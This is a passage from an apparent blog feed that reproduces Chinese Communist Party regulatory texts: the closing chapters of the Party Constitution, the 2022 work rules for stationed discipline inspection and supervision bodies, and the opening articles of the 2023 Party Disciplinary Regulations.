<p>  <strong>第四十六条</strong>　党的各级纪律检查委员会是党内监督专责机关，主要任务是：维护党的章程和其他党内法规，检查党的路线、方针、政策和决议的执行情况，协助党的委员会推进全面从严治党、加强党风建设和组织协调反腐败工作，推动完善党和国家监督体系。</p>
<p>  党的各级纪律检查委员会的职责是监督、执纪、问责，要经常对党员进行遵守纪律的教育，作出关于维护党纪的决定；对党的组织和党员领导干部履行职责、行使权力进行监督，受理处置党员群众检举举报，开展谈话提醒、约谈函询；检查和处理党的组织和党员违反党的章程和其他党内法规的比较重要或复杂的案件，决定或取消对这些案件中的党员的处分；进行问责或提出责任追究的建议；受理党员的控告和申诉；保障党员的权利。</p>
<p>  各级纪律检查委员会要把处理特别重要或复杂的案件中的问题和处理的结果，向同级党的委员会报告。党的地方各级纪律检查委员会和基层纪律检查委员会要同时向上级纪律检查委员会报告。</p>
<p>  各级纪律检查委员会发现同级党的委员会委员有违犯党的纪律的行为，可以先进行初步核实，如果需要立案检查的，应当在向同级党的委员会报告的同时向上一级纪律检查委员会报告；涉及常务委员的，报告上一级纪律检查委员会，由上一级纪律检查委员会进行初步核实，需要审查的，由上一级纪律检查委员会报它的同级党的委员会批准。</p>
<p>  <strong>第四十七条</strong>　上级纪律检查委员会有权检查下级纪律检查委员会的工作，并且有权批准和改变下级纪律检查委员会对于案件所作的决定。如果所要改变的该下级纪律检查委员会的决定，已经得到它的同级党的委员会的批准，这种改变必须经过它的上一级党的委员会批准。</p>
<p>  党的地方各级纪律检查委员会和基层纪律检查委员会如果对同级党的委员会处理案件的决定有不同意见，可以请求上一级纪律检查委员会予以复查；如果发现同级党的委员会或它的成员有违犯党的纪律的情况，在同级党的委员会不给予解决或不给予正确解决的时候，有权向上级纪律检查委员会提出申诉，请求协助处理。</p>
<h2 id="第九章-党组"><a href="#第九章-党组" class="headerlink" title="第九章 党组"></a>第九章 党组</h2><p>  <strong>第四十八条</strong>　在中央和地方国家机关、人民团体、经济组织、文化组织和其他非党组织的领导机关中，可以成立党组。党组发挥领导作用。党组的任务，主要是负责贯彻执行党的路线、方针、政策；加强对本单位党的建设的领导，履行全面从严治党责任；讨论和决定本单位的重大问题；做好干部管理工作；讨论和决定基层党组织设置调整和发展党员、处分党员等重要事项；团结党外干部和群众，完成党和国家交给的任务；领导机关和直属单位党组织的工作。</p>
<p>  <strong>第四十九条</strong>　党组的成员，由批准成立党组的党组织决定。党组设书记，必要时还可以设副书记。</p>
<p>  党组必须服从批准它成立的党组织领导。</p>
<p>  <strong>第五十条</strong>　在对下属单位实行集中统一领导的国家工作部门和有关单位的领导机关中，可以建立党委，党委的产生办法、职权和工作任务，由中央另行规定。</p>
<h2 id="第十章-党和共产主义青年团的关系"><a href="#第十章-党和共产主义青年团的关系" class="headerlink" title="第十章 党和共产主义青年团的关系"></a>第十章 党和共产主义青年团的关系</h2><p>  <strong>第五十一条</strong>　中国共产主义青年团是中国共产党领导的先进青年的群团组织，是广大青年在实践中学习中国特色社会主义和共产主义的学校，是党的助手和后备军。共青团中央委员会受党中央委员会领导。共青团的地方各级组织受同级党的委员会领导，同时受共青团上级组织领导。</p>
<p>  <strong>第五十二条</strong>　党的各级委员会要加强对共青团的领导，注意团的干部的选拔和培训。党要坚决支持共青团根据广大青年的特点和需要，生动活泼地、富于创造性地进行工作，充分发挥团的突击队作用和联系广大青年的桥梁作用。</p>
<p>  团的县级和县级以下各级委员会书记，企业事业单位的团委员会书记，是党员的，可以列席同级党的委员会和常务委员会的会议。</p>
<h2 id="第十一章-党旗党徽"><a href="#第十一章-党旗党徽" class="headerlink" title="第十一章 党旗党徽"></a>第十一章 党旗党徽</h2><p>  <strong>第五十三条</strong>　中国共产党党徽为镰刀和锤头组成的图案。</p>
<p>  <strong>第五十四条</strong>　中国共产党党旗为旗面缀有金黄色党徽图案的红旗。</p>
<p>  <strong>第五十五条</strong>　中国共产党的党徽党旗是中国共产党的象征和标志。党的各级组织和每一个党员都要维护党徽党旗的尊严。要按照规定制作和使用党徽党旗。</p>
]]></content>
      <categories>
        <category>工具书</category>
      </categories>
      <tags>
        <tag>综合法规</tag>
      </tags>
  </entry>
  <entry>
    <title>纪检监察机关派驻机构工作规则（2022年6月22日）</title>
    <url>/2024/10/20/%E7%BA%AA%E6%A3%80%E7%9B%91%E5%AF%9F%E6%9C%BA%E5%85%B3%E6%B4%BE%E9%A9%BB%E6%9C%BA%E6%9E%84%E5%B7%A5%E4%BD%9C%E8%A7%84%E5%88%99%EF%BC%882022%E5%B9%B46%E6%9C%8822%E6%97%A5%EF%BC%89/</url>
    <content><![CDATA[<h2 id="第一章-总-则"><a href="#第一章-总-则" class="headerlink" title="第一章 总 则"></a>第一章 总 则</h2><p>  <strong>第一条</strong> 为了加强和规范纪检监察机关派驻机构工作，根据《中国共产党纪律检查委员会工作条例》和《中华人民共和国监察法》，制定本规则。</p>
<p>  <strong>第二条</strong> 派驻机构工作坚持以习近平新时代中国特色社会主义思想为指导，增强“四个意识”、坚定“四个自信”、做到“两个维护”，坚持自我革命，坚持敢于斗争，坚持实事求是，深入贯彻全面从严治党战略方针，坚定不移推进党风廉政建设和反腐败斗争，建立健全系统集成、协同高效的派驻监督体制机制，增强“派”的权威和“驻”的优势，一体推进不敢腐、不能腐、不想腐，充分发挥监督保障执行、促进完善发展作用。</p>
<p>  <strong>第三条</strong> 在党中央集中统一领导下，中央纪律检查委员会国家监察委员会向中央一级党和国家机关以及其他组织派驻纪检监察机构，地方各级纪律检查委员会监察委员会向本级党和国家机关以及其他组织派驻纪检监察机构。派驻机构是派出机关的组成部分，与驻在单位是监督和被监督的关系。</p>
<p>  派驻机构应当强化政治监督，把坚持和加强党的领导贯穿工作全过程各方面，推动驻在单位切实做到“两个维护”，贯彻党的理论和路线方针政策，落实党中央决策部署。</p>
<p>  <strong>第四条</strong> 派驻机构遵循以下原则开展工作：</p>
<p>  （一）坚持党中央集中统一领导，强化组织自上而下的监督功能；</p>
<p>  （二）坚持民主集中制，重要事项集体研究决定；</p>
<p>  （三）坚持敢于善于监督，完善常态化监督工作机制；</p>
<p>  （四）坚持职责定位，依规依纪依法履行职责；</p>
<p>  （五）坚持各项监督统筹衔接，推动全面从严治党主体责任和监督责任一体落实；</p>
<p>  （六）坚持监督与被监督相统一，自觉接受各方面监督。</p>
<p>第五条 派驻机构应当持续深化转职能、转方式、转作风，聚焦全面从严治党、党风廉政建设和反腐败工作，强化监督职责，突出工作重点，创新履职方式，有效运用“四种形态”，增强派驻监督全覆盖的有效性，推动派驻监督工作高质量发展。</p>
<h2 id="第二章-组织设置"><a href="#第二章-组织设置" class="headerlink" title="第二章 组织设置"></a>第二章 组织设置</h2><p>  <strong>第六条</strong> 中央纪律检查委员会国家监察委员会向中央一级党和国家机关、中管金融企业派驻纪检监察组。地方各级纪律检查委员会监察委员会向本级党和国家机关、所管辖的国有金融企业派驻纪检监察组。</p>
<p>  中央纪律检查委员会国家监察委员会、地方各级纪律检查委员会监察委员会按照规定向国有企业、普通高等学校等单位派驻纪检监察组；或者依法派驻监察机构，派驻监察专员并设立监察专员办公室，与该单位党的纪律检查机构合署办公。</p>
<p>  对系统规模大、直属单位多、监督对象多的单位，可以单独派驻纪检监察组；对业务关联度高，或者需要统筹力量实施监督的相关单位，可以综合派驻纪检监察组。</p>
<p>  <strong>第七条</strong> 派驻机构主要负责人按照规定担任驻在单位的党组（党委）成员，履行监督专责，不分管驻在单位工作。</p>
<p>  派驻机构主要负责人实行交流任职、定期轮岗。</p>
<p>  <strong>第八条</strong> 派驻机构的领导机构是组务会。组务会由派驻机构正职、副职组成。组务会会议学习贯彻落实党中央决策部署，贯彻中央纪委国家监委工作部署，落实派出机关工作安排，研究讨论管辖范围内纪检监察工作的重要问题、重要事项，按照权限讨论或者决定党纪政务处分等事项。</p>
<p>  派驻机构应当健全组务会会议以及组长办公会议、专题会议等会议制度，完善议事决策机制。</p>
<p>  <strong>第九条</strong> 派驻机构应当按照信访举报、监督检查、审查调查、案件监督管理、案件审理相互协调、相互制约的原则，结合实际设置内设机构或者明确人员分工。</p>
<h2 id="第三章-领导体制"><a href="#第三章-领导体制" class="headerlink" title="第三章 领导体制"></a>第三章 领导体制</h2><p>  <strong>第十条</strong> 各级党委应当加强对纪检监察机关派驻机构工作的领导，健全机构设置、干部管理、工作保障等机制，听取纪律检查委员会监察委员会关于派驻监督工作的汇报，推动派驻机构履职尽责。</p>
<p>  <strong>第十一条</strong> 驻在单位应当支持配合派驻机构工作，主动及时通报重要情况、重要问题，根据派驻机构工作需要提供有关材料，为派驻机构开展工作创造条件、提供保障。</p>
<p>  <strong>第十二条</strong> 派驻机构由派出机关直接领导、统一管理，向派出机关负责，受派出机关监督。</p>
<p>  各级纪律检查委员会常务委员会应当定期听取派驻监督工作情况报告。派出机关分管领导应当定期召开派驻机构负责人会议，经常同派驻机构主要负责人研究工作。</p>
<p>  <strong>第十三条</strong> 派出机关相关部门根据职能职责，加强对派驻机构的指导、联系、服务和保障。</p>
<p>  监督检查部门协助分管领导联系派驻机构日常工作：</p>
<p>  （一）指导督促派驻机构履行职责；</p>
<p>  （二）对派驻机构请示报告的问题、事项进行审核把关；</p>
<p>  （三）对派出机关交办的重要案件、事项进行督促办理；</p>
<p>  （四）办理派驻机构提请支持、协调的重要事项；</p>
<p>  （五）向派驻机构通报驻在单位领导班子及其成员、驻在单位上级党委管理的其他人员的一般性问题和谈话提醒、批评教育、责令检查、诫勉谈话等情况；</p>
<p>  （六）联系开展其他工作。</p>
<p>  <strong>第十四条</strong> 派出机关相关部门应当会同派驻机构联合开展以下监督工作：</p>
<p>  （一）开展专项检查，推动驻在单位落实党中央决策部署；</p>
<p>  （二）研判驻在单位政治生态，有针对性地开展监督；</p>
<p>  （三）开展专题调查研究，查找分析利用公共权力和资源设租寻租、离职后违规从业等行业性、系统性廉洁风险，向驻在单位提出意见建议或者督促开展专项治理；</p>
<p>  （四）支持配合派出机关同级党委巡视巡察机构开展工作，对整改情况进行监督；</p>
<p>  （五）推动驻在单位落实纪检监察建议；</p>
<p>  （六）其他需要联合开展的监督工作。</p>
<p>  <strong>第十五条</strong> 派出机关监督检查部门、审查调查部门对于派驻机构管辖的重大、复杂案件，经批准可以直接办理或者组织、指挥办理。</p>
<p>  <strong>第十六条</strong> 派出机关相关部门应当指导、协调派驻机构与地方纪律检查委员会监察委员会协作开展以下工作：</p>
<p>  （一）协同开展专项检查、专项监督，推动解决有关系统和领域的突出问题；</p>
<p>  （二）协作采取监督检查、审查调查措施；</p>
<p>  （三）协商确定驻在单位党员、干部以及监察对象涉嫌违纪和职务违法、职务犯罪案件的管辖，或者由派驻机构报请派出机关指定有关地方纪委监委管辖；</p>
<p>  （四）联合审查调查驻在单位党员、干部以及监察对象涉嫌违纪和职务违法、职务犯罪案件；</p>
<p>  （五）其他需要协作开展的工作。</p>
<p>  <strong>第十七条</strong> 派出机关相关部门应当组织、指导各派驻机构之间协作配合开展以下工作：</p>
<p>  （一）针对共性或者关联性问题同步开展专项监督；</p>
<p>  （二）对重大、复杂案件进行联合审查调查；</p>
<p>  （三）协作开展案件审理、复议复查和复审工作；</p>
<p>  （四）对派出机关部署的重要工作落实情况开展交叉检查或者联合检查；</p>
<p>  （五）联合开展调研、培训；</p>
<p>  （六）其他需要协作配合开展的工作。</p>
<p>  <strong>第十八条</strong> 派驻机构应当加强对驻在单位内设纪检机构及直属单位纪检机构的业务指导和监督检查，督促、支持其发挥职能作用，推动纪检干部队伍建设，加强政治教育和业务培训，协调人员力量开展监督执纪工作。</p>
<p>  <strong>第十九条</strong> 派驻垂直管理单位的纪检监察组应当加强对驻在单位的下一级单位纪检机构的业务指导和监督检查，对驻在单位各级纪检机构的工作进行统筹，推动层层落实监督责任。下一级单位纪检机构的监督执纪工作以派驻纪检监察组领导为主，线索处置和案件查办在向同级党组（党委）报告的同时应当一并向派驻纪检监察组报告。</p>
<p>  实行双重领导并以上级单位领导为主的单位，国有企业、国有金融企业的派驻机构工作，参照前款规定执行。</p>
<p>  <strong>第二十条</strong>各级纪律检查委员会监察委员会派出的机关纪检监察工作委员会，按照规定审理有关派驻机构审查调查的案件，定期向派出机关报告案件审理工作情况。在派出机关领导下，建立健全案件质量评查机制，向派驻机构反馈评查结果。</p>
<p>  机关纪检监察工作委员会应当加强与派驻机构的沟通协调，对本级党和国家机关部门机关纪委的执纪审查工作进行协同指导。</p>
<p>  <strong>第二十一条</strong> 派驻国有资产监管机构、教育行政部门等的纪检监察组，按照规定协助派出机关加强对国有企业、普通高等学校等单位派驻机构工作的指导，形成监督合力。</p>
<p>  派驻国有资产监管机构的纪检监察组，应当加强对驻在单位党组（党委）管理领导班子的国有企业纪检机构监督执纪工作的领导。相关国有企业纪检机构的线索处置和案件查办在向同级党委报告的同时，应当一并向派驻纪检监察组报告。</p>
<h2 id="第四章-工作职责"><a href="#第四章-工作职责" class="headerlink" title="第四章 工作职责"></a>第四章 工作职责</h2><p>  <strong>第二十二条</strong> 派驻机构依规依纪依法履行监督执纪问责和监督调查处置职责。</p>
<p>  <strong>第二十三条</strong> 派驻机构应当把监督作为基本职责，结合驻在单位实际，重点监督检查以下情况：</p>
<p>  （一）对党忠诚，践行党的性质宗旨情况；</p>
<p>  （二）贯彻党的理论和路线方针政策、落实党中央决策部署、践行“两个维护”情况；</p>
<p>  （三）落实全面从严治党主体责任、加强党风廉政建设和反腐败工作情况；</p>
<p>  （四）贯彻执行民主集中制、依规依法履职用权、廉洁自律等情况。</p>
<p>  <strong>第二十四条</strong> 派驻机构应当重点监督以下对象：</p>
<p>  （一）驻在单位领导班子及其成员特别是主要负责人；</p>
<p>  （二）驻在单位上级党委管理的其他人员；</p>
<p>  （三）驻在单位党组（党委）管理的领导班子及其成员；</p>
<p>  （四）其他列入重点监督对象的驻在单位人员。</p>
<p>  <strong>第二十五条</strong> 派驻机构应当支持和督促驻在单位党组（党委）落实全面从严治党主体责任，协助其开展内部巡视巡察，推动驻在单位深化改革、健全制度、完善治理、防控风险。</p>
<p>  <strong>第二十六条</strong> 派驻机构应当结合派驻监督工作情况，推动驻在单位党组（党委）开展全面从严治党、党风廉政建设和反腐败工作的形势任务教育，强化纪法教育、警示教育，推进廉洁文化建设，教育引导党员、干部以及监察对象修身律己，筑牢思想道德防线。</p>
<p>  <strong>第二十七条</strong> 派驻机构对反映驻在单位党组织和党员、干部以及监察对象问题的检举控告，按照规定受理和处置。</p>
<p>  <strong>第二十八条</strong> 派驻机构对驻在单位领导班子及其成员、驻在单位上级党委管理的其他人员涉嫌违纪和职务违法、职务犯罪问题线索，经批准可以参与派出机关的初步核实、审查调查工作。</p>
<p>  <strong>第二十九条</strong> 派驻机构负责审查以下党组织和党员涉嫌违犯党纪的案件：</p>
<p>  （一）驻在单位党组（党委）直接领导的党组织；</p>
<p>  （二）驻在单位党组（党委）管理的领导班子成员；</p>
<p>  （三）本规则第二十四条第四项规定的人员。</p>
<p>  派驻机构必要时可以审查驻在单位党组（党委）管理的其他党组织和党员涉嫌违犯党纪的案件。</p>
<p>  派驻机构根据派出机关授权，依法调查驻在单位监察对象涉嫌职务违法、职务犯罪案件。</p>
<p>  <strong>第三十条</strong> 派驻机构按照管理权限，对违纪违法的驻在单位党组织和党员、干部以及监察对象进行处理处分，对不履行或者不正确履行职责的驻在单位党组织和领导干部进行问责。</p>
<p>  <strong>第三十一条</strong> 派驻机构负责受理和处置以下申诉或者复审申请：</p>
<p>  （一）党组织和党员对派驻机构所作处理决定不服的申诉；</p>
<p>  （二）监察对象对派驻机构所作处理决定不服的复审申请；</p>
<p>  （三）被调查人及其近亲属对派驻机构及其工作人员侵害被调查人合法权益行为的申诉。</p>
<p>  对于派驻机构立案审查调查后由驻在单位作出处理决定案件的申诉或者复核申请，派驻机构应当协助驻在单位做好有关处置工作。</p>
<h2 id="第五章-履职程序"><a href="#第五章-履职程序" class="headerlink" title="第五章 履职程序"></a>第五章 履职程序</h2><p>  <strong>第三十二条</strong> 派驻机构开展日常监督应当深入实际、深入群众，监督方式包括：</p>
<p>  （一）参加会议。参加或者列席驻在单位领导班子会议等重要会议，了解学习贯彻党中央决策部署以及上级党组织决定情况和班子成员的意见态度，“三重一大”决策制度执行情况，按照规定向派出机关报告。</p>
<p>  （二）谈心谈话。同党员、干部和群众广泛谈心谈话，听取对监督对象的反映，发现监督对象存在苗头性、倾向性问题的，进行谈话提醒、批评教育。</p>
<p>  （三）听取汇报。听取驻在单位党组（党委）管理的领导班子及其成员履行管党治党责任情况的汇报，发现责任落实不到位的，进行提醒纠正。</p>
<p>  （四）查阅资料。按照规定查阅、复制驻在单位有关文件、资料、数据等材料，了解核实有关情况。</p>
<p>  （五）沟通情况。加强与驻在单位机关党委、党委办公室和组织人事、巡视巡察、法规法务、财务审计等部门的沟通，及时发现和通报问题。</p>
<p>  （六）分析研判。分析信访举报、党风廉政等情况，对典型性、普遍性问题向驻在单位提出意见建议。</p>
<p>  （七）廉政把关。建立健全、动态更新驻在单位党组（党委）管理的领导干部廉政档案，严把党风廉政意见回复关。</p>
<p>  （八）实地调查。开展驻点调研、现场核查，精准发现驻在单位存在的突出问题。</p>
<p>  （九）其他开展日常监督的方式。</p>
<p>  <strong>第三十三条</strong> 派驻机构应当严格执行报告制度，发现驻在单位领导班子及其成员重要问题、重要事项及时向派出机关报告。</p>
<p>  派驻机构应当经常对驻在单位领导班子及其成员坚持党的领导、加强党的建设、履行全面从严治党主体责任情况以及党风廉政状况进行分析，每年向派出机关提交专题报告。</p>
<p>  &nbsp;<strong>第三十四条</strong> 派驻机构应当定期会同驻在单位党组（党委）专题研究全面从严治党、党风廉政建设和反腐败工作。派出机关监督检查部门根据情况派员参加。</p>
<p>  派驻机构主要负责人应当经常与驻在单位党组（党委）主要负责人就政治生态、作风建设、廉洁风险等情况交换意见，提出工作建议，督促完善有关制度措施。</p>
<p>  <strong>第三十五条</strong> 派驻机构应当向驻在单位领导班子成员通报其分管部门和单位领导干部遵守党章党规党纪、廉洁自律等情况，推动领导班子成员落实“一岗双责”要求，抓好分管部门和单位的党风廉政建设工作。</p>
<p>  <strong>第三十六条</strong> 派驻机构对驻在单位开展内部巡视巡察提供以下协助：</p>
<p>  （一）通报监督执纪执法中发现的问题；</p>
<p>  （二）处置内部巡视巡察移交的问题线索；</p>
<p>  （三）检查整改责任落实情况；</p>
<p>  （四）其他协助内部巡视巡察的工作。</p>
<p>  <strong>第三十七条</strong> 派驻机构应当指定专人负责管理涉嫌违纪和职务违法、职务犯罪问题线索，逐件编号登记，建立管理台账。</p>
<p>  派驻机构应当结合日常监督掌握的情况，对问题线索进行综合分析、适当了解，采取谈话函询、初步核实、暂存待查、予以了结等方式进行处置。线索处置意见应当自收到线索之日起1个月内提出。</p>
<p>  处置问题线索应当报派驻机构主要负责人审批，并按照规定报派出机关备案。</p>
<p>  <strong>第三十八条</strong> 派驻机构经过初步核实，需要进行立案审查调查的，应当报派驻机构主要负责人审批。其中，对驻在单位党组（党委）直接领导的党组织、党组（党委）管理的领导班子成员中的正职领导干部立案和副职领导干部涉嫌严重职务违法、职务犯罪立案的，应当报派出机关审批。</p>
<p>  派驻机构在立案前应当征求驻在单位党组（党委）主要负责人意见，对于有不同意见的应当报派出机关决定。确因安全保密等特殊情况，经派出机关同意，也可以在立案后及时向驻在单位党组（党委）主要负责人通报。</p>
<p>  <strong>第三十九条</strong> 派驻机构按照规定报批后，可以依规依纪依法采取谈话、讯问、询问、留置、查询、冻结、搜查、调取、查封、扣押（暂扣、封存）、勘验检查、鉴定措施。对依法应当交有关机关执行的措施，报派出机关审批并以派出机关名义办理。</p>
<p>  派驻机构应当对审查调查措施进行严格监管，建立措施使用台账，定期将有关情况报派出机关案件监督管理部门、监督检查部门备案。</p>
<p>  <strong>第四十条</strong> 派驻机构审查调查工作结束后，应当按照规定进行审理，提出纪律处理或者党纪处分建议、拟作出的政务处分决定或者处分建议，通报驻在单位党组（党委）。</p>
<p>  <strong>第四十一条</strong> 驻在单位党组（党委）按照权限和程序，对违纪的党组织、党员作出纪律处理或者党纪处分决定。</p>
<p>  派驻机构按照管理权限，对违法的监察对象依法作出政务处分决定；建议驻在单位处分的，由驻在单位依法依规作出处分决定。</p>
<p>  派驻机构提出的处理处分建议与驻在单位党组（党委）的意见不同又不能协商一致的，由派驻机构报派出机关研究决定。</p>
<p>  <strong>第四十二条</strong> 派驻机构发现驻在单位党组（党委）管理的党组织和领导干部失职失责造成严重后果或者恶劣影响，需要进行问责调查的，应当报派驻机构主要负责人审批后，启动问责调查程序。</p>
<p>  派驻机构应当依规依纪依法开展问责调查，查明失职失责问题，按照管理权限作出问责决定，或者向有权作出问责决定的党组织（单位）提出问责建议。</p>
<p>  对党组织采取改组方式问责的，按照党章和其他党内法规规定的权限、程序执行。对领导干部采取党纪政务处分方式问责的，按照本规则第三十八条、第四十条、第四十一条办理。</p>
<p>  <strong>第四十三条</strong> 派驻机构对调查的监察对象和涉案人员涉嫌职务犯罪案件，经集体审议，认为犯罪事实清楚，证据确实、充分，需要追究刑事责任的，依法依规移送人民检察院审查起诉。</p>
<p>  <strong>第四十四条</strong> 派驻机构发现驻在单位在贯彻党中央决策部署、落实全面从严治党主体责任、开展党风廉政建设以及决策机制、监督管理、制度执行等方面存在突出问题或者薄弱环节的，应当提出纪检监察建议。</p>
<p>派驻机构应当加强对驻在单位问题整改情况的监督检查，督促限期整改、反馈，推动纪检监察建议落实到位。</p>
<h2 id="第六章-管理监督"><a href="#第六章-管理监督" class="headerlink" title="第六章 管理监督"></a>第六章 管理监督</h2><p>  <strong>第四十五条</strong> 派驻机构必须坚持以习近平新时代中国特色社会主义思想武装头脑、指导实践、推动工作，以党的政治建设为统领推进党的各方面建设，教育引导派驻机构干部忠于职守、履职尽责，不断提高政治判断力、政治领悟力、政治执行力，带头增强“四个意识”、坚定“四个自信”、做到“两个维护”，发扬党的优良传统和作风，加强思想淬炼、政治历练、实践锻炼、专业训练，增强法治意识、程序意识、证据意识，建设政治素质高、忠诚干净担当、专业化能力强、敢于善于斗争的派驻机构干部队伍。</p>
<p>  派驻机构党组织应当严格执行党的组织生活制度，推进党支部标准化规范化建设，增强党组织政治功能和组织力凝聚力，发挥战斗堡垒作用。</p>
<p>  <strong>第四十六条</strong> 派出机关应当严把派驻机构干部入口关，按照干部管理权限统筹派出机关和派驻机构干部的选拔任用、人员交流、考核培训、监督管理，有计划地安排派驻机构干部参与派出机关工作、进行培养锻炼。</p>
<p>  <strong>第四十七条</strong> 派出机关应当每年组织派驻机构主要负责人进行述责述廉。结合驻在单位特点，对派驻机构履行职责以及自身建设等方面情况进行考核。考核中，应当听取驻在单位领导班子和有关方面的意见，并将其作为考核的重要依据。</p>
<p>  <strong>第四十八条</strong> 派驻机构应当加强规范化、法治化、正规化建设，明确职权范围，健全内控机制，规范工作流程和审批权限，完善回避、保密和过问、干预案件登记备案等管理制度，建立健全办案安全责任制，推动各项工作依规依纪依法进行。</p>
<p>  <strong>第四十九条</strong> 派驻机构应当坚持打铁必须自身硬，坚持严的标准，勇于刀刃向内，牢固树立监督者更要自觉接受监督的意识，加强自我管理、自我约束，不断提高免疫力，切实防治“灯下黑”。</p>
<p>  派驻机构应当接受派出机关同级党委巡视巡察监督和派出机关的管理监督，对所提监督意见进行整改落实，并报告整改情况。</p>
<p>  派驻机构应当明确专门机构或者人员负责干部日常管理监督工作，及时汇总各方面意见，对自身权力运行的关键环节进行经常性检查，认真核查相关检举控告，按照规定将处置情况向派出机关干部监督部门报告。</p>
<p>  派驻机构应当听取驻在单位领导班子对派驻机构工作的意见建议，认真研究处理，并及时反馈。自觉接受驻在单位党员、干部和群众的监督，畅通意见反映渠道，对反映的问题进行调查核实处置，不断完善制度、改进工作。</p>
<p>  <strong>第五十条</strong> 派驻机构干部有跑风漏气、迟报瞒报、滥用职权、以案谋私以及其他违规违纪违法行为的，依规依纪依法严肃处理；构成犯罪的，依法追究刑事责任。</p>
<p>  <strong>第五十一条</strong> 派驻机构及其领导干部不履行或者不正确履行职责，导致应当发现的问题没有发现，或者发现问题不报告不处置，执纪执法不严格不规范，造成严重后果或者恶劣影响的，予以严肃问责。</p>
<h2 id="第七章-附-则"><a href="#第七章-附-则" class="headerlink" title="第七章 附 则"></a>第七章 附 则</h2><p>  <strong>第五十二条</strong> 本规则涉及的审批权限均指最低审批权限，工作中根据需要可以按照更高层级的审批权限报批。</p>
<p>  <strong>第五十三条</strong> 派驻国有企业、普通高等学校的监察机构、监察专员（监察专员办公室）除执行本规则外，还应当执行中央纪律检查委员会国家监察委员会相关规定。</p>
<p>  <strong>第五十四条</strong> 中央军事委员会可以根据本规则制定相关细则。</p>
<p>  <strong>第五十五条</strong> 本规则由中央纪律检查委员会国家监察委员会负责解释。</p>
<p>  <strong>第五十六条</strong> 本规则自发布之日起施行。此前发布的其他有关纪检监察机关派驻机构工作的规定，凡与本规则不一致的，按照本规则执行。</p>
]]></content>
      <categories>
        <category>工具书</category>
      </categories>
      <tags>
        <tag>实体法规</tag>
      </tags>
  </entry>
  <entry>
    <title>中国共产党纪律处分条例（2023年12月19日）</title>
    <url>/2024/10/17/%E4%B8%AD%E5%9B%BD%E5%85%B1%E4%BA%A7%E5%85%9A%E7%BA%AA%E5%BE%8B%E5%A4%84%E5%88%86%E6%9D%A1%E4%BE%8B%EF%BC%882023%E5%B9%B412%E6%9C%8819%E6%97%A5%EF%BC%89/</url>
    <content><![CDATA[<h2 id="第一编-总则"><a href="#第一编-总则" class="headerlink" title="第一编　总则"></a>第一编　总则</h2><h3 id="第一章-总体要求和适用范围"><a href="#第一章-总体要求和适用范围" class="headerlink" title="第一章　总体要求和适用范围"></a>第一章　总体要求和适用范围</h3><p>  <strong>第一条</strong>　为了维护党章和其他党内法规，严肃党的纪律，纯洁党的组织，保障党员民主权利，教育党员遵纪守法，维护党的团结统一，保证党的理论、路线、方针、政策、决议和国家法律法规的贯彻执行，根据《中国共产党章程》，制定本条例。</p>
<p>  <strong>第二条</strong>　党的纪律建设必须坚持以马克思列宁主义、毛泽东思想、邓小平理论、“三个代表”重要思想、科学发展观、习近平新时代中国特色社会主义思想为指导，坚持和加强党的全面领导，坚决维护习近平总书记党中央的核心、全党的核心地位，坚决维护以习近平同志为核心的党中央权威和集中统一领导，弘扬伟大建党精神，坚持自我革命，贯彻全面从严治党战略方针，落实新时代党的建设总要求，推动解决大党独有难题、健全全面从严治党体系，全面加强党的纪律建设，为以中国式现代化全面推进强国建设、民族复兴伟业提供坚强纪律保障。</p>
<p>  <strong>第三条</strong>　党章是最根本的党内法规，是管党治党的总规矩。党的纪律是党的各级组织和全体党员必须遵守的行为规则。党组织和党员必须坚守初心使命，牢固树立政治意识、大局意识、核心意识、看齐意识，始终坚定道路自信、理论自信、制度自信、文化自信，切实践行正确的权力观、政绩观、事业观，自觉遵守和维护党章，严格执行和维护党的纪律，自觉接受党的纪律约束，模范遵守国家法律法规。</p>
<p>  <strong>第四条</strong>　党的纪律处分工作遵循下列原则：</p>
<p>  （一）坚持党要管党、全面从严治党。把严的基调、严的措施、严的氛围长期坚持下去，加强对党的各级组织和全体党员的教育、管理和监督，把纪律挺在前面，抓早抓小、防微杜渐。</p>
<p>  （二）党纪面前一律平等。对违犯党纪的党组织和党员必须严肃、公正执行纪律，党内不允许有任何不受纪律约束的党组织和党员。</p>
<p>  （三）实事求是。对党组织和党员违犯党纪的行为，应当以事实为依据，以党章、其他党内法规和国家法律法规为准绳，执纪执法贯通，准确认定行为性质，区别不同情况，恰当予以处理。</p>
<p>  （四）民主集中制。实施党纪处分，应当按照规定程序经党组织集体讨论决定，不允许任何个人或者少数人擅自决定和批准。上级党组织对违犯党纪的党组织和党员作出的处理决定，下级党组织必须执行。</p>
<p>  （五）惩前毖后、治病救人。处理违犯党纪的党组织和党员，应当实行惩戒与教育相结合，做到宽严相济。</p>
<p>  <strong>第五条</strong>　深化运用监督执纪“四种形态”，经常开展批评和自我批评，及时进行谈话提醒、批评教育、责令检查、诫勉，让“红红脸、出出汗”成为常态；党纪轻处分、组织调整成为违纪处理的大多数；党纪重处分、重大职务调整的成为少数；严重违纪涉嫌犯罪追究刑事责任的成为极少数。</p>
<p>  <strong>第六条</strong>　本条例适用于违犯党纪应当受到党纪责任追究的党组织和党员。</p>
<h3 id="第二章-违纪与纪律处分"><a href="#第二章-违纪与纪律处分" class="headerlink" title="第二章　违纪与纪律处分"></a>第二章　违纪与纪律处分</h3><p>  <strong>第七条</strong>　党组织和党员违反党章和其他党内法规，违反国家法律法规，违反党和国家政策，违反社会主义道德，危害党、国家和人民利益的行为，依照规定应当给予纪律处理或者处分的，都必须受到追究。</p>
<p>  重点查处党的十八大以来不收敛、不收手，问题线索反映集中、群众反映强烈，政治问题和经济问题交织的腐败案件，违反中央八项规定精神的问题。</p>
<p>  <strong>第八条</strong>　对党员的纪律处分种类：</p>
<p>  （一）警告；</p>
<p>  （二）严重警告；</p>
<p>  （三）撤销党内职务；</p>
<p>  （四）留党察看；</p>
<p>  （五）开除党籍。</p>
<p>  <strong>第九条</strong>　对于违犯党纪的党组织，上级党组织应当责令其作出书面检查或者给予通报批评。对于严重违犯党纪、本身又不能纠正的党组织，上一级党的委员会在查明核实后，根据情节严重的程度，可以予以：</p>
<p>  （一）改组；</p>
<p>  （二）解散。</p>
<p>  <strong>第十条</strong>　党员受到警告处分一年内、受到严重警告处分一年半内，不得在党内提拔职务或者进一步使用，也不得向党外组织推荐担任高于其原任职务的党外职务或者进一步使用。</p>
